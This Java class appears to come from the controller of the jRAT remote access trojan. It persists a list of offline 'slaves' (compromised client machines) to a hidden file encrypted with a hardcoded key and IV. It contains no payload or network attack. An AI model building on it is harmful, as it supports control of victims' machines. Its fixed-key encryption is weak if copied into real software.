package io.jrat.controller.settings;

import io.jrat.common.crypto.CryptoUtils;
import io.jrat.common.crypto.KeyUtils;
import io.jrat.controller.AbstractSlave;
import io.jrat.controller.Globals;
import io.jrat.controller.Main;
import io.jrat.controller.OfflineSlave;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;

public class StoreOfflineSlaves extends AbstractStorable {
	
	private static final List<AbstractSlave> LIST = new ArrayList<AbstractSlave>();
	private static final StoreOfflineSlaves INSTANCE = new StoreOfflineSlaves();
	private static final long TIME_TO_LIVE = 1000L * 60L * 60L * 24L * 7L; // 1 week
	
	public static StoreOfflineSlaves getGlobal() {
		return INSTANCE;
	}

	public List<AbstractSlave> getList() {
		return LIST;
	}
	
	@Override
	public void save() throws Exception {
		CipherOutputStream cos = new CipherOutputStream(new FileOutputStream(getFile()), CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, KeyUtils.STATIC_KEY, KeyUtils.STATIC_IV));
		BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cos));
		
		for (AbstractSlave os : LIST) {
			writer.write(OfflineSlave.toString((OfflineSlave) os));
			writer.newLine();
		}
		
		writer.close();
	}

	@Override
	public void load() throws Exception {
		LIST.clear();
		
		CipherInputStream cos = new CipherInputStream(new FileInputStream(getFile()), CryptoUtils.getBlockCipher(Cipher.DECRYPT_MODE, KeyUtils.STATIC_KEY, KeyUtils.STATIC_IV));

		BufferedReader reader = new BufferedReader(new InputStreamReader(cos));
		
		String line;
		
		while ((line = reader.readLine()) != null) {
			OfflineSlave os = OfflineSlave.fromString(line);
						
			if (System.currentTimeMillis() - os.getCreation() > TIME_TO_LIVE) {
				continue;
			}
			
			LIST.add(os);

			Main.instance.getPanelClients().addSlave(os);
		}
		
		reader.close();
	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), ".offline");
	}

	public void add(OfflineSlave offlineSlave) {
		for (AbstractSlave os : getList()) {
			if (os.equals(offlineSlave)) {
				LIST.remove(os);
				break;
			}
		}

		LIST.add(offlineSlave);
	}
	
	public void remove(OfflineSlave offlineSlave) {
		for (int i = 0; i < getList().size(); i++) {
			if(((OfflineSlave) getList().get(i)).getRandomId() == offlineSlave.getRandomId()) {
				getList().remove(i);
			}
		}
	}

	public void remove(int id) {
		for (int i = 0; i < getList().size(); i++) {
			if(((OfflineSlave) getList().get(i)).getRandomId() == id) {
				getList().remove(i);
			}
		}
		
	}

}